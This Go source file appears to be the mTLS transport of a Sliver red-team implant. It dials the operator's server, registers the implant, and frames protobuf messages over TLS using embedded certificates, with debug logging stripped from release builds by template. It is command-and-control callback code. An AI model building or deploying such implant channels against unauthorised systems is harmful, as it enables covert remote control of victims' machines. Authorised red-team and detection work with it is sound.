package main

// {{if .MTLSServer}}

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"fmt"

	// {{if .Debug}}
	"log"
	// {{else}}
	// {{end}}

	"os"
	pb "sliver/protobuf/sliver"

	"github.com/golang/protobuf/proto"
)

func mtlsRegisterSliver(conn *tls.Conn) {
	envelope := getRegisterSliver()
	socketWriteEnvelope(conn, envelope)
}

// socketWriteEnvelope - Writes a message to the TLS socket using length prefix framing
// which is a fancy way of saying we write the length of the message then the message
// e.g. [uint32 length|message] so the reciever can delimit messages properly
func socketWriteEnvelope(connection *tls.Conn, envelope *pb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Debug}}
		log.Print("Envelope marshaling error: ", err)
		// {{end}}
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	connection.Write(dataLengthBuf.Bytes())
	connection.Write(data)
	return nil
}

// socketReadEnvelope - Reads a message from the TLS connection using length prefix framing
func socketReadEnvelope(connection *tls.Conn) (*pb.Envelope, error) {
	dataLengthBuf := make([]byte, 4) // Size of uint32
	_, err := connection.Read(dataLengthBuf)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Socket error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))

	// Read the length of the data
	readBuf := make([]byte, readBufSize)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		n, err := connection.Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Debug}}
			log.Printf("Read error: %s\n", err)
			// {{end}}
			break
		}
	}

	// Unmarshal the protobuf envelope
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Unmarshaling envelope error: %v", err)
		// {{end}}
		return &pb.Envelope{}, err
	}

	return envelope, nil
}

// tlsConnect - Get a TLS connection or die trying
func tlsConnect(address string, port uint16) (*tls.Conn, error) {
	tlsConfig := getTLSConfig()
	connection, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", address, port), tlsConfig)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Unable to connect: %v", err)
		// {{end}}
		return nil, err
	}
	return connection, nil
}

func getTLSConfig() *tls.Config {

	certPEM, err := tls.X509KeyPair([]byte(certPEM), []byte(keyPEM))
	if err != nil {
		// {{if .Debug}}
		log.Printf("Cannot load sliver certificate: %v", err)
		// {{end}}
		os.Exit(5)
	}

	// Load CA cert
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM([]byte(caCertPEM))

	// Setup config with custom certificate validation routine
	tlsConfig := &tls.Config{
		Certificates:          []tls.Certificate{certPEM},
		RootCAs:               caCertPool,
		InsecureSkipVerify:    true, // Don't worry I sorta know what I'm doing
		VerifyPeerCertificate: rootOnlyVerifyCertificate,
	}
	tlsConfig.BuildNameToCertificate()

	return tlsConfig
}

// {{end}} -MTLSServer
